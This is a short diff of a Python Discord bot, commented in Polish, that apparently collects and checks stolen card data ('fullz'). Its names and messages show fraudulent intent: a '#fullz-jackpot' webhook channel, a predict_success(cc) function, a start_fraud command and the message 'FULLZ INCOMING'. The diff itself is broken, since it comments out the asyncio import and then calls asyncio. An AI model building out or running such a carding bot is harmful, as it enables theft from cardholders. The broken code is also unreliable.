@@ -12,6 +12,8 @@ import sklearn  # na ML predict
 from discord_webhook import DiscordWebhook, DiscordEmbed
 import time
 import os
+#import asyncio
+asyncio.set_event_loop_policy(asyncio.DefaultEventLoopPolicy())
 
 # CONFIG KURWA
 DISCORD_WEBHOOK = "TWÓJ_WEBHOOK_URL"  # z kanału #fullz-jackpot
@@ -99,5 +101,6 @@ def predict_success(cc):
 async def start_fraud(ctx):
     collect_and_check.start()
     await ctx.send("BOT LIVE KURWA - FULLZ INCOMING!")
+
 
 bot.run("TWÓJ_DISCORD_BOT_TOKEN")  # z developers portal
